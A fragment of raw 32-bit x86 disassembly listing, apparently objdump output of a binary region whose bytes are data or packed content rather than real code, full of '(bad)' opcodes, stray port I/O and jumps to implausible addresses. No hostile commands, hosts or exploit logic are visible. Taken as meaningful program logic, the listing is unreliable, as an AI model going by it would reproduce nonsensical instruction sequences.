  4340b0:	add    esi,edx
  4340b2:	out    dx,al
  4340b3:	xchg   edi,eax
  4340b4:	add    BYTE PTR [eax],al
  4340b6:	add    BYTE PTR [eax],al
  4340b8:	add    BYTE PTR [ebx-0x3b38fd6a],dh
  4340be:	fdiv   st,st(6)
  4340c0:	add    al,0xe3
  4340c2:	mov    ?,ecx
  4340c4:	scas   al,BYTE PTR es:[edi]
  4340c5:	ja     0x434117
  4340c7:	xchg   ebx,eax
  4340c8:	add    al,0x5a
  4340ca:	cmp    cl,BYTE PTR [ebp-0x3040b582]
  4340d0:	lods   eax,DWORD PTR ds:[esi]
  4340d1:	dec    edx
  4340d2:	mov    edi,0x2e0cdfd1
  4340d7:	and    eax,0x4cb29003
  4340dc:	(bad)  
  4340dd:	jae    0x434071
  4340df:	stos   BYTE PTR es:[edi],al
  4340e0:	cdq    
  4340e1:	nop
  4340e2:	frstor [ebp+0x18ea304]
  4340e8:	sbb    al,0x3
  4340ea:	dec    ecx
  4340eb:	sub    al,0x4
  4340ed:	push   ss
  4340ee:	jbe    0x434160
  4340f0:	adc    ebp,edi
  4340f2:	sar    DWORD PTR [edx],1
  4340f4:	add    eax,0x183b39fa
  4340f9:	xchg   esp,eax
  4340fa:	inc    ebp
  4340fb:	sbb    edi,0x8f04dcbb
  434101:	mov    bl,0x96
  434103:	sbb    al,0x8f
  434105:	mov    bl,0x96
  434107:	adc    al,0x8f
  434109:	mov    bl,0x96
  43410b:	in     al,dx
  43410c:	mov    ?,WORD PTR [ebx-0x6a]
  43410f:	push   cs
  434110:	not    BYTE PTR [esi]
  434112:	xchg   edx,eax
  434113:	cmp    ch,dh
  434115:	out    dx,al
  434116:	xchg   ecx,eax
  434117:	cmp    al,BYTE PTR [esi+0x32]
  43411a:	jmp    0x434aef
  43411f:	add    BYTE PTR [eax],al
  434121:	add    BYTE PTR [edi+esi*8-0x40e8c0bf],dl
  434128:	xor    dh,cl
  43412a:	cmp    dh,BYTE PTR [ecx]
  43412c:	in     al,0xf6
  43412e:	str    WORD PTR [esi]
  434131:	jmp    0xf10ad8c9
  434136:	icebp  
  434137:	mov    ds:0xb244651b,al
  43413c:	push   cs
  43413d:	jmp    0xc97627f6
  434142:	sub    BYTE PTR [esi],0xb4
  434145:	jmp    0x2d68f3dd
  43414a:	test   al,0x9a
  43414c:	sbb    ebp,DWORD PTR [ebp+0x30]
  43414f:	mov    dl,0xe
  434151:	jmp    0xfe2f393c
  434156:	outs   dx,DWORD PTR ds:[esi]
  434157:	xchg   edx,eax
  434158:	aas    
  434159:	sbb    ebx,0x766eb48
  43415f:	pop    edx
  434160:	xchg   ecx,eax
  434161:	dec    esp
  434162:	sub    DWORD PTR [esi],0xffffff94
  434165:	jmp    0xccdcf3fd
  43416a:	xchg   DWORD PTR [edx],edi
  43416c:	dec    edx
  43416d:	or     eax,0xad4b7d70
  434172:	xchg   DWORD PTR [ecx-0x41a841d9],esi
  434178:	sbb    DWORD PTR [ecx+edx*1-0x3e],ebx
  43417c:	and    eax,0x3ebe47c6
  434181:	loop   0x4341ed
  434183:	mul    BYTE PTR [ecx-0x5e]
  434186:	add    BYTE PTR [eax],al
  434188:	add    BYTE PTR [eax],al
  43418a:	add    BYTE PTR [esi],dl
  43418c:	out    dx,al
  43418d:	xor    al,ch
  43418f:	fisubr DWORD PTR [ecx+0x7]
  434192:	add    BYTE PTR [ecx-0x16891a22],ch
  434198:	jp     0x4341ec
  43419a:	and    al,0xd5
  43419c:	lods   eax,DWORD PTR ds:[esi]
  43419d:	in     eax,0x15
  43419f:	in     eax,0x9b
  4341a1:	dec    esi
  4341a2:	add    BYTE PTR [ecx+esi*2],ah
  4341a5:	bound  edx,QWORD PTR [edx]
  4341a7:	inc    ebx
  4341a8:	mov    eax,0xabd5b945
  4341ad:	push   cs
  4341ae:	add    BYTE PTR [esp+ebp*4-0x60560015],cl
  4341b5:	push   edx
  4341b6:	stc    
  4341b7:	bound  ecx,QWORD PTR [esi+0x33a94791]
  4341bd:	pop    edx
  4341be:	and    al,0x89
  4341c0:	jnp    0x434183
  4341c2:	mov    DWORD PTR [eax+0x35],ebp
  4341c5:	dec    ebp
  4341c6:	push   esp
  4341c7:	loop   0x4341bc
  4341c9:	xor    ch,BYTE PTR [eax]
  4341cb:	lock scas al,BYTE PTR es:[edi]
  4341cd:	xchg   ecx,eax
  4341ce:	jg     0x434171
  4341d0:	cmp    ebp,esp
  4341d2:	lgs    ebp,FWORD PTR [ecx+esi*8+0x4]
  4341d7:	ret    0x32c3
  4341da:	sub    BYTE PTR [edx-0x527c099e],dh
  4341e0:	mov    cl,0xe8
  4341e2:	sub    BYTE PTR ds:0x45000a8c,0xb5
  4341e9:	cmp    eax,0x7c24ff
  4341ee:	inc    eax
  4341ef:	add    BYTE PTR [eax],al
  4341f1:	add    BYTE PTR [eax],al
  4341f3:	add    BYTE PTR [ecx],ch
  4341f5:	xor    eax,0xb134eba9
  4341fa:	popa   
  4341fb:	and    al,0xa1
  4341fd:	scas   eax,DWORD PTR es:[edi]
  4341fe:	popa   
  4341ff:	and    al,0x91
  434201:	scas   eax,DWORD PTR es:[edi]
  434202:	popa   
  434203:	and    al,0x91
  434205:	call   0x9808b6ef
  43420a:	in     eax,0x54
  43420c:	aad    0x97
  43420e:	inc    ebp
  43420f:	pop    esi
  434210:	nop
  434211:	dec    BYTE PTR [ebx-0x42]
  434214:	js     0x43426f
  434216:	jns    0x43423c
  434218:	push   0x90440aa1
  43421d:	mov    eax,ds:0x59910a8c
  434222:	pushf  
  434223:	imul   BYTE PTR [edx]
  434225:	jne    0x4342a5
  434227:	inc    ebx
  434228:	les    ecx,FWORD PTR [ecx+0x6185f93f]
  43422e:	(bad)  
  43422f:	aas    
  434230:	nop
  434231:	fdiv   DWORD PTR [ebx-0x4]
  434234:	nop
  434235:	and    DWORD PTR [ebx+0x56],ebx
  434238:	nop
  434239:	pop    ecx
  43423a:	call   0xfcff:0x27eb604b
  434241:	inc    ecx
  434242:	call   0xe006:0x4edabc4f
  434249:	xchg   esi,eax
  43424a:	adc    al,BYTE PTR [eax]
  43424c:	in     eax,0x75
  43424e:	call   0x9000:0x12019ab4
  434255:	out    0x16,al
  434257:	or     al,BYTE PTR [eax]
  434259:	add    BYTE PTR [eax],al
  43425b:	add    BYTE PTR [eax],al
  43425d:	fwait
  43425e:	xor    DWORD PTR [edx+ebx*1+0x1b],esp
  434262:	int    0x1c
  434264:	fcom   QWORD PTR [eax+0x55fd0f59]
  43426a:	pop    eax
  43426b:	shl    BYTE PTR ds:0x7cfe6838,1
  434271:	fucom  st(5)
  434273:	or     eax,0x1bf091b1
  434278:	sub    eax,0x85d21950
  43427d:	lods   eax,DWORD PTR ds:[esi]
  43427e:	loope  0x434211
  434280:	dec    ebx
  434281:	or     al,0x84
  434283:	and    al,0xc0
  434285:	clc    
  434286:	pop    es
  434287:	std    
  434288:	(bad)  
  434289:	call   DWORD PTR [edi-0x4d440064]
  43428f:	add    BYTE PTR [eax+0x53],bh
  434292:	xchg   dh,bh
  434294:	ja     0x43423d
  434296:	xchg   BYTE PTR ds:0x37869b78,dl
  43429c:	js     0x43423d
  43429e:	xchg   BYTE PTR [eax],bh
  4342a0:	js     0x434225
  4342a2:	xchg   BYTE PTR [ecx],bh
  4342a4:	js     0x43431d
  4342a6:	xchg   ah,ah
  4342a8:	jbe    0x43423c
  4342aa:	xor    bl,BYTE PTR [esi+0x2]
  4342ad:	jae    0x43426d
  4342af:	sbb    al,0x40
  4342b1:	jb     0x434271
  4342b3:	loope  0x4342f4
  4342b5:	jp     0x434275
  4342b7:	in     eax,0x3f
  4342b9:	bound  edi,QWORD PTR [esi-0x424ac037]
  4342bf:	fnstsw WORD PTR [edi]
  4342c1:	add    BYTE PTR [eax],al
  4342c3:	add    BYTE PTR [eax],al
  4342c5:	add    ah,dh
  4342c7:	(bad)  
  4342c8:	icebp  
  4342c9:	aas    
  4342ca:	repz (bad) 
  4342cc:	icebp  
  4342cd:	add    DWORD PTR [edi],0xffffffb4
  4342d0:	mov    esp,0x2e329276
  4342d5:	push   es
  4342d6:	mov    bl,0xc6
  4342d8:	clc    
  4342d9:	xor    al,0x50
  4342db:	jbe    0x4342a5
  4342dd:	ret    
  4342de:	shl    BYTE PTR [ebp+0x26],1
  4342e1:	pop    edx
  4342e2:	rol    DWORD PTR [ecx-0x36],0xef
  4342e6:	lahf   
  4342e7:	repnz cmc 
  4342e9:	mov    WORD PTR [ebx-0x6fb81782],es
  4342ef:	sub    eax,0xc742865d
  4342f4:	sbb    dl,BYTE PTR [ebp-0x1b]
  4342f7:	mov    dl,0xf5
  4342f9:	add    dl,BYTE PTR [eax-0x73d846d1]
  4342ff:	loop   0x4342d0
  434301:	and    eax,ebp
  434303:	call   0xa3db595c
  434308:	mov    ch,0x3
  43430a:	push   ebp
  43430b:	call   0xa6d3e11e
  434310:	loop   0x4342ea
  434312:	push   ebx
  434313:	mov    dl,0x97
  434315:	fist   WORD PTR [esi]
  434317:	inc    ebp
  434318:	popa   
  434319:	or     eax,DWORD PTR [ebx+ebx*8+0x4c]
  43431d:	mov    al,0xd4
  43431f:	aaa    
  434320:	add    ebp,edx
  434322:	pop    esp
  434323:	test   BYTE PTR [esi],0x6a
  434326:	mov    edi,0x943f7a
  43432b:	add    BYTE PTR [eax],al
  43432d:	add    BYTE PTR [eax],al
  43432f:	imul   esi,DWORD PTR [edi],0xb39168dd
  434335:	push   cs
  434336:	icebp  
  434337:	aaa    
  434338:	sub    eax,0xaa93e994
  43433d:	mov    fs,WORD PTR [edx-0x16f24d74]
  434343:	mov    ?,ebx
  434345:	(bad)  
  434346:	add    DWORD PTR ss:0xbb8be90e,esi
  43434d:	lea    edi,[edi+0x690eb28c]
  434353:	aas    
  434354:	mov    dl,0xe
  434356:	mov    cl,0x77
  434358:	stos   DWORD PTR es:[edi],eax
  434359:	push   eax
  43435a:	mov    eax,ds:0x255f7e35
  43435f:	mov    WORD PTR ds:0x35801cc0,?
  434365:	into   
  434366:	adc    eax,0x70be377b
  43436b:	test   eax,0x8c255f86
  434370:	aaa    
  434371:	pop    eax
  434372:	in     eax,dx
  434373:	or     BYTE PTR [ecx+0x62],bh
  434376:	fnstsw WORD PTR [edx+0x77]
  434379:	pusha  
  43437a:	icebp  
  43437b:	push   0x6b
  43437d:	sbb    esp,DWORD PTR [edi-0x5b]
  434380:	inc    ecx
  434381:	jmp    0x43436c
  434383:	or     ah,BYTE PTR [edx-0x6f]
  434386:	sub    DWORD PTR [ebx],ebp
  434388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434389:	xchg   ecx,eax
  43438a:	add    BYTE PTR [ebx+0x3b8b19ba],ch
  434390:	mov    ecx,0xc08f
  434395:	add    BYTE PTR [eax],al
  434397:	add    BYTE PTR ds:0x3bc321b1,bh
  43439d:	lods   eax,DWORD PTR ds:[esi]
  43439e:	and    edi,eax
  4343a0:	out    0x36,al
  4343a2:	dec    edx
  4343a3:	add    ecx,edi
  4343a5:	mov    ah,0x91
  4343a7:	adc    ch,BYTE PTR [esp+eiz*2-0x6d]
  4343ab:	adc    eax,0x52c3bd
  4343b0:	dec    esp
  4343b1:	push   edx
  4343b2:	adc    eax,0xde8d6fb7
  4343b7:	xor    esi,DWORD PTR [eax+0x2d]
  4343ba:	clc    
  4343bb:	cmp    edi,DWORD PTR [edx+0x3c8d66c6]
  4343c1:	mov    ch,0xe
  4343c3:	add    BYTE PTR [ecx],ch
  4343c5:	repnz push cs
  4343c7:	add    BYTE PTR [ecx+0x581c74a4],ch
  4343cd:	and    edx,DWORD PTR [edx+0x24]
  4343d0:	(bad)  
  4343d1:	cli    
  4343d2:	or     eax,0x3ed14600
  4343d7:	imul   ecx,DWORD PTR [ebp+eiz*8+0x15]
  4343dc:	leave  
  4343dd:	test   al,0x4e
  4343df:	add    dl,bh
  4343e1:	ja     0x4343fd
  4343e3:	lea    ebp,[ebp+0x656a3a8a]
  4343e9:	in     al,0x3f
  4343eb:	call   FWORD PTR [esp+ecx*2+0x1b]
  4343ef:	inc    eax
  4343f0:	cmp    DWORD PTR [ebx],ebp
  4343f2:	into   
  4343f3:	je     0x43446e
  4343f5:	dec    BYTE PTR ds:0x23b42800
  4343fb:	inc    esp
  4343fc:	add    BYTE PTR [eax],al
  4343fe:	add    BYTE PTR [eax],al
  434400:	add    BYTE PTR [ebp-0x80],cl
  434403:	pop    edi
  434404:	push   es
  434405:	jo     0x4343f1
  434407:	xor    bh,BYTE PTR [eax]
  434409:	dec    edx
  43440a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43440b:	xchg   ecx,eax
  43440c:	ins    BYTE PTR es:[edi],dx
  43440d:	nop
  43440e:	lods   eax,DWORD PTR ds:[esi]
  43440f:	and    bh,BYTE PTR [edi+0x4d]
  434412:	dec    edx
  434413:	psubw  mm1,QWORD PTR [edi]
  434416:	cmp    eax,0xe4fb35da
  43441b:	mov    ah,0x66
  43441d:	push   eax
  43441e:	jno    0x43442f
  434420:	xor    BYTE PTR [eax-0x10acc0b7],dl
  434426:	ds aas 
  434428:	push   cs
  434429:	push   eax
  43442a:	dec    ecx
  43442b:	cwde   
  43442c:	ror    BYTE PTR [ecx],1
  43442e:	aas    
  43442f:	and    ebp,DWORD PTR [ebp+0x4c]
  434432:	dec    ecx
  434433:	xchg   esi,eax
  434434:	into   
  434435:	lahf   
  434436:	into   
  434437:	lods   eax,DWORD PTR ds:[esi]
  434438:	add    BYTE PTR [eax+0x7bc72049],dl
  43443e:	inc    eax
  43443f:	sbb    DWORD PTR [ebp-0x57],edi
  434442:	dec    ecx
  434443:	verw   bp
  434446:	dec    ecx
  434447:	ud0    esp,DWORD PTR [edi-0x6fff6b32]
  43444e:	dec    ecx
  43444f:	jg     0x43448c
  434451:	nop
  434452:	dec    ecx
  434453:	movups xmm7,xmm2
  434456:	push   ebp
  434457:	inc    eax
  434458:	mov    ecx,esp
  43445a:	mov    ch,0xa
  43445c:	mov    dh,0x90
  43445e:	dec    ecx
  43445f:	adc    BYTE PTR [eax-0x11ae9f20],al
  434465:	add    BYTE PTR [eax],al
  434467:	add    BYTE PTR [eax],al
  434469:	add    BYTE PTR [edi+0x3e],ch
  43446c:	outs   dx,DWORD PTR ds:[esi]
  43446d:	adc    dl,al
  43446f:	dec    ecx
  434470:	mov    es,esp
  434472:	mov    esi,ss
  434474:	push   esi
  434475:	and    al,0x80
  434477:	mov    bl,0x2e
  434479:	push   eax
  43447a:	out    0x38,al
  43447c:	add    ebp,eax
  43447e:	mov    eax,ds:0x50831289
  434483:	pop    eax
  434484:	xchg   ebx,eax
  434485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434486:	nop
  434487:	dec    ecx
  434488:	getsec 
  43448a:	mov    esp,0xa32419b2
  43448f:	and    BYTE PTR [eax+0x50],0x74
  434493:	sahf   
  434494:	add    bh,cl
  434496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434497:	jl     0x434465
  434499:	mov    ah,0xe2
  43449b:	xor    al,0x7
  43449d:	js     0x43443b
  43449f:	sub    esp,DWORD PTR [ecx+0x3a2ba027]
  4344a5:	sub    DWORD PTR [esi],esi
  4344a7:	mov    ebp,DWORD PTR ds:0xa128e001
  4344ad:	daa    
  4344ae:	test   BYTE PTR [ecx],ch
  4344b0:	and    DWORD PTR [edi],0x6bb5cc80
  4344b6:	nop
  4344b7:	xor    ch,0x3
  4344ba:	arpl   ax,bp
  4344bc:	adc    al,0x17
  4344be:	pusha  
  4344bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4344c0:	mov    ch,0x3
  4344c2:	adc    eax,0x7c176e62
  4344c7:	ret    
  4344c8:	mov    cl,0x3
  4344ca:	adc    esp,DWORD PTR [edx+ecx*2+0x17]
  4344ce:	add    BYTE PTR [eax],al
  4344d0:	add    BYTE PTR [eax],al
  4344d2:	add    BYTE PTR ds:0x152011ee,cl
  4344d8:	(bad)  
  4344d9:	sbb    DWORD PTR [edx*4-0x20affbf],edx
  4344e0:	(bad)  
  4344e2:	retf   0xd06f
  4344e5:	lods   al,BYTE PTR ds:[esi]
  4344e6:	cld    
  4344e7:	jns    0x4344fd
  4344e9:	loope  0x43455b
  4344eb:	int3   
  4344ec:	mov    dl,0xe8
  4344ee:	retf   0xb117
  4344f1:	pop    esi
  4344f2:	dec    ecx
  4344f3:	mov    WORD PTR [ebx],gs
  4344f5:	loop   0x434536
  4344f7:	in     eax,dx
  4344f8:	div    ch
  4344fa:	mov    ss,esi
  4344fc:	jb     0x43449a
  4344fe:	add    edx,DWORD PTR [eax-0x6fff6e04]
  434504:	mov    dl,0x5e
  434506:	dec    ebx
  434507:	js     0x434532
  434509:	push   cs
  43450a:	mov    eax,ds:0x1f4e4b10
  43450f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434510:	inc    ecx
  434511:	xchg   ebp,eax
  434512:	mov    bl,0x8f
  434514:	aaa    
  434515:	pusha  
  434516:	in     eax,0x58
  434518:	dec    edi
  434519:	pusha  
  43451a:	neg    BYTE PTR [eax+0x43]
  43451d:	arpl   dx,si
  43451f:	sbb    cl,ch
  434521:	rcl    DWORD PTR es:[ebx-0x36],cl
  434525:	fucompp 
  434527:	xchg   ebx,eax
  434528:	mov    dl,0x44
  43452a:	pusha  
  43452b:	dec    ecx
  43452c:	mov    dh,0xeb
  43452e:	aam    0x73
  434530:	mov    al,ds:0x7710e94e
  434535:	sbb    dh,BYTE PTR [edx+0x0]
  434538:	add    BYTE PTR [eax],al
  43453a:	add    BYTE PTR [eax],al
  43453c:	aad    0x57
  43453e:	adc    dl,bl
  434540:	rcr    ebx,cl
  434542:	dec    esp
  434543:	lods   al,BYTE PTR ds:[esi]
  434544:	push   0xd0c1d2bf
  434549:	loopne 0x43458e
  43454b:	jb     0x434507
  43454d:	aam    0x4e
  43454f:	adc    DWORD PTR [ebx+0x1296e337],0x51
  434556:	push   cs
  434557:	jmp    0xf52e8106
  43455c:	xor    esp,DWORD PTR [eax-0xef916b2]
  434562:	adc    ch,BYTE PTR [edx+0x50]
  434565:	scas   al,BYTE PTR es:[edi]
  434566:	xchg   ebp,eax
  434567:	les    esi,FWORD PTR cs:0xd8dae56c
  43456e:	iret   
  43456f:	pop    ds
  434570:	pop    es
  434571:	dec    ebp
  434572:	xchg   ecx,eax
  434573:	mov    bh,0xe0
  434575:	icebp  
  434576:	inc    ebx
  434577:	fisubr DWORD PTR [edx-0x11]
  43457a:	cwde   
  43457b:	out    0xa7,eax
  43457d:	cmp    esp,DWORD PTR [ecx-0xd]
  434580:	adc    edi,DWORD PTR [eax-0x593f3bf3]
  434586:	xchg   edi,eax
  434587:	add    BYTE PTR [edi-0x4c],ch
  43458a:	xchg   ecx,eax
  43458b:	rol    edx,cl
  43458d:	push   0x39bdb2f6
  434592:	in     eax,0x84
  434594:	stc    
  434595:	ror    DWORD PTR [ecx],0x8b
  434598:	mov    cl,BYTE PTR [ebp+0x3]
  43459b:	cmp    al,0xc0
  43459d:	ret    
  43459e:	push   ss
  43459f:	mov    eax,DWORD PTR [eax]
  4345a1:	add    BYTE PTR [eax],al
  4345a3:	add    BYTE PTR [eax],al
  4345a5:	out    0xb5,eax
  4345a7:	imul   eax,esi,0x3c114bf4
  4345ad:	(bad)
  4345b2:	lock jmp 0x434537
  4345b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4345b6:	mov    ah,0xe9
  4345b8:	out    dx,eax
  4345b9:	ss xor al,0xe5
  4345bc:	add    ch,BYTE PTR ds:0x625f4176
  4345c2:	jo     0x43460c
  4345c4:	ret    
  4345c5:	sbb    BYTE PTR [edi+eiz*1],dh
  4345c8:	inc    eax
  4345c9:	sub    bh,BYTE PTR [ebp+0xe]
  4345cc:	add    BYTE PTR [ebp-0x50],al
  4345cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4345d0:	fstp   st(1)
  4345d2:	mov    al,0xe
  4345d4:	pop    ecx
  4345d5:	push   0xffffffe0
  4345d7:	cmp    esi,esi
  4345d9:	pop    es
  4345da:	cmp    bh,bh
  4345dc:	pop    ss
  4345dd:	stos   BYTE PTR es:[edi],al
  4345de:	lock push cs
  4345e0:	push   eax
  4345e1:	inc    ecx
  4345e2:	idiv   BYTE PTR [ecx+0x44]
  4345e5:	test   eax,0x88efff37
  4345ea:	lock push cs
  4345ec:	test   DWORD PTR [ecx],edi
  4345ee:	int3   
  4345ef:	or     eax,0xea01cb8
  4345f4:	add    BYTE PTR [edx-0x9],dl
  4345f7:	xchg   ebx,eax
  4345f8:	xor    eax,0x52c3b1
  4345fd:	loopne 0x434581
  4345ff:	es jae 0x4345b7
  434602:	mov    dh,0x93
  434604:	xor    eax,0x44645990
  434609:	add    BYTE PTR [eax],al
  43460b:	add    BYTE PTR [eax],al
  43460d:	add    BYTE PTR [eax-0x3cbbe12e],dl
  434613:	lea    edx,[edx]
  434615:	xchg   DWORD PTR [ebp-0x6fbb894b],eax
  43461b:	rcr    BYTE PTR [esi],1
  43461d:	cmp    al,0xa3
  43461f:	xchg   ebp,eax
  434620:	adc    ah,ch
  434622:	jge    0x4345ea
  434624:	sub    esp,DWORD PTR [esp+edx*4]
  434627:	stc    
  434628:	js     0x43466a
  43462a:	test   al,0x49
  43462c:	ud0    ecx,DWORD PTR [edi]
  43462f:	add    al,0xe8
  434631:	adc    ebx,DWORD PTR [eax+0xb004f5a]
  434637:	inc    esp
  434638:	mov    ?,edx
  43463a:	jge    0x434628
  43463c:	and    al,0xc0
  43463e:	dec    esi
  43463f:	and    dl,ah
  434641:	dec    edi
  434642:	out    0x3e,eax
  434644:	pop    es
  434645:	or     eax,0x32a4950
  43464a:	push   eax
  43464b:	sbb    BYTE PTR [ebx],ch
  43464d:	add    BYTE PTR [esp+edx*2-0x59],al
  434651:	(bad)  [eax-0x2ca8f0b7]
  434657:	sbb    BYTE PTR ds:0x27070b51,bh
  43465d:	ins    DWORD PTR es:[edi],dx
  43465e:	push   esp
  43465f:	dec    ecx
  434660:	and    al,0xd5
  434662:	or     eax,0xd3c5e55
  434667:	xchg   esi,eax
  434668:	cs or  al,0x40
  43466b:	ror    BYTE PTR [ebp+0x10],1
  43466e:	(bad)  
  43466f:	in     al,0xfe
  434671:	or     BYTE PTR [eax],al
  434673:	add    BYTE PTR [eax],al
  434675:	add    BYTE PTR [eax],al
  434677:	mov    DWORD PTR ds:[eax],esp
  43467a:	push   eax
  43467b:	jg     0x434601
  43467d:	push   ss
  43467e:	stc    
  43467f:	popf   
  434680:	push   ecx
  434681:	add    BYTE PTR [eax-0x70],al
  434684:	inc    edx
  434685:	inc    esi
  434686:	add    al,0xdd
  434688:	mov    dl,0xe4
  43468a:	mov    ecx,cs
  43468c:	mov    ds:0xaadccb72,al
  434691:	lea    edi,[edi-0x7463c4b6]
  434697:	jmp    0x1574a73e
  43469c:	imul   edi,DWORD PTR [ebp+0x6e],0xffffffbe
  4346a0:	cmp    esp,DWORD PTR [ebp+ecx*4+0x2a]
  4346a4:	xor    eax,0x294c6f63
  4346a9:	adc    bh,BYTE PTR [ebp*4-0x49140a0a]
  4346b0:	ds inc esp
  4346b2:	stc    
  4346b3:	adc    eax,0x4c75057d
  4346b8:	mov    dl,0x7a
  4346ba:	stc    
  4346bb:	test   BYTE PTR [edx+0x3b8c712c],bl
  4346c1:	retf   0x9fc3
  4346c4:	repnz cmc 
  4346c6:	mov    WORD PTR [ecx-0x6413dbd9],fs
  4346cc:	mov    eax,0x3c0df90c
  4346d1:	jp     0x4346c5
  4346d3:	inc    ebx
  4346d4:	dec    edx
  4346d5:	mov    esp,0xa59d0f59
  4346da:	je     0x4346dc
  4346dc:	add    BYTE PTR [eax],al
  4346de:	add    BYTE PTR [eax],al
  4346e0:	push   esp
  4346e1:	mov    dl,0x5e
  4346e3:	pop    ss
  4346e4:	push   eax
  4346e5:	mov    edi,0x727d03b9
  4346ea:	sbb    BYTE PTR [edx-0x1b],0x30
  4346ee:	rcl    ebx,0x9e
  4346f1:	cmp    dh,ch
  4346f3:	clc    
  4346f4:	sbb    DWORD PTR [edx+0x7b9043e8],0xfffffff2
  4346fb:	inc    ebx
  4346fc:	cmc    
  4346fd:	out    dx,al
  4346fe:	cmc    
  4346ff:	outs   dx,DWORD PTR ds:[esi]
  434700:	xchg   esi,eax
  434701:	cli    
  434702:	mov    DWORD PTR [ebx],edx
  434704:	nop
  434705:	mov    dl,0xe
  434707:	rcl    BYTE PTR [esi+0x3a],0xeb
  43470b:	jmp    0x1a95c51c
  434710:	shl    BYTE PTR [edx+0x4a86150e],1
  434716:	pop    ds
  434717:	xchg   esi,eax
  434718:	dec    eax
  434719:	cmp    al,0xf5
  43471b:	push   esp
  43471c:	xchg   edx,eax
  43471d:	mov    dl,0xe
  43471f:	sbb    al,0xe2
  434721:	das    
  434722:	and    ecx,eax
  434724:	mov    esp,0x651e0eee
  434729:	dec    ebp
  43472a:	test   DWORD PTR [edi],0xdd12cc6b
  434730:	xchg   BYTE PTR [edi],ch
  434732:	pop    esp
  434733:	stc    
  434734:	mov    BYTE PTR [ecx*2+0x4d2d641f],al
  43473b:	or     DWORD PTR [ebx+edi*1+0x64],ebx
  43473f:	cmc    
  434740:	clc    
  434741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434742:	dec    edx
  434743:	xlat   BYTE PTR ds:[ebx]
  434744:	add    BYTE PTR [eax],al
  434746:	add    BYTE PTR [eax],al
  434748:	add    BYTE PTR [ebx-0x4e],dl
  43474b:	xchg   edi,eax
  43474c:	scas   eax,DWORD PTR es:[edi]
  43474d:	xchg   edi,eax
  43474e:	mov    bh,0xd2
  434750:	(bad)  
  434752:	test   DWORD PTR [edi+0x442f83af],edx
  434758:	in     eax,dx
  434759:	add    al,0xeb
  43475b:	sub    ah,BYTE PTR [ebp+edx*2-0x4b]
  43475f:	aaa    
  434760:	and    ecx,edx
  434762:	cmp    dh,dh
  434764:	jo     0x4347b3
  434766:	cmp    DWORD PTR [eax-0x2f485c59],ebx
  43476c:	in     al,dx
  43476d:	sbb    al,0xf3
  43476f:	es mov dl,0xc3
  434772:	(bad)  
  434773:	std    
  434774:	adc    edx,edx
  434776:	loop   0x4347ee
  434778:	lods   eax,DWORD PTR ds:[esi]
  434779:	mov    WORD PTR [edx-0x3983c4f2],?
  43477f:	adc    eax,ebp
  434781:	xchg   ebx,eax
  434782:	mov    bh,0xd2
  434784:	add    BYTE PTR [ebp+0x210502c],al
  43478a:	icebp  
  43478b:	push   ss
  43478c:	mov    DWORD PTR [eax+0x2c],edi
  43478f:	and    BYTE PTR [ebp-0x74773ce1],al
  434795:	je     0x43471c
  434797:	jns    0x4347dd
  434799:	imul   esp,esp,0xb936ff8f
  43479f:	test   BYTE PTR [eax],al
  4347a1:	cmp    DWORD PTR [ebp-0x5be2e26f],esi
  4347a7:	dec    esi
  4347a8:	add    BYTE PTR [edx+esi*8+0x1432],ah
  4347af:	add    BYTE PTR [eax],al
  4347b1:	add    BYTE PTR [ecx-0x11fba2bf],cl
  4347b7:	icebp  
  4347b8:	xor    bl,BYTE PTR [eax+ebp*1]
  4347bb:	mov    ch,0xeb
  4347bd:	push   DWORD PTR [esi+0x3912bea3]
  4347c3:	mov    ch,0x8f
  4347c5:	rcr    ch,0xc4
  4347c8:	xchg   ecx,eax
  4347c9:	xor    eax,0x52c591
  4347ce:	ins    BYTE PTR es:[edi],dx
  4347cf:	dec    eax
  4347d0:	bound  esp,QWORD PTR [esi+0x72]
  4347d3:	sub    dh,BYTE PTR [edx]
  4347d5:	int3   
  4347d6:	stc    
  4347d7:	mov    ah,0xe
  4347d9:	cmp    DWORD PTR [edi],eax
  4347db:	cmp    DWORD PTR [edi+0x1c],ebx
  4347de:	(bad)  
  4347df:	call   0xc4b682e2
  4347e4:	push   edi
  4347e5:	(bad)  
  4347e6:	sti    
  4347e7:	cmp    BYTE PTR [edx],ah
  4347e9:	enter  0x773a,0x31
  4347ed:	retf   0x2a40
  4347f0:	xor    cl,ah
  4347f2:	mov    ecx,0x7030eb4
  4347f7:	mov    cl,0xf1
  4347f9:	and    BYTE PTR [edx-0x10],dh
  4347fc:	sbb    dh,BYTE PTR [edx+0x7a]
  4347ff:	sub    eax,0x50901050
  434804:	mov    ecx,0x294cbe40
  434809:	or     al,0xbb
  43480b:	add    DWORD PTR [eax+0x23],esp
  43480e:	stos   DWORD PTR es:[edi],eax
  43480f:	xchg   DWORD PTR [esi],edx
  434811:	xchg   DWORD PTR [esi+eiz*4],ebx
  434814:	(bad)  
  434815:	add    BYTE PTR [eax],al
  434817:	add    BYTE PTR [eax],al
  434819:	add    BYTE PTR [eax],al
  43481b:	nop
  43481c:	dec    ecx
  43481d:	adc    BYTE PTR [edx-0x80],cl
  434820:	mov    esi,0x797c242b
  434825:	jecxz  0x434898
  434827:	xchg   esp,eax
  434828:	rcl    BYTE PTR [ebx+0xf4a5c24],cl
  43482e:	add    BYTE PTR [edi],bh
  434830:	sbb    eax,0x56c8c98
  434835:	lldt   WORD PTR [eax+0x1e8339d4]
  43483c:	aas    
  43483d:	mov    dl,0x85
  43483f:	pop    edi
  434840:	(bad)  
  434841:	in     al,0x9
  434843:	or     eax,0xff9e466
  434848:	loope  0x434848
  43484a:	jmp    0x4347ed
  43484c:	or     DWORD PTR [edi],ecx
  43484e:	test   DWORD PTR [ebp-0x6fbba04f],edi
  434854:	(bad)  
  434855:	mov    DWORD PTR [ebx-0x74af0a11],0x5002ad4c
  43485f:	or     ecx,DWORD PTR [ecx]
  434861:	(bad)  
  434862:	clc    
  434863:	pop    edi
  434864:	cmp    eax,0x5750b214
  434869:	aas    
  43486a:	stc    
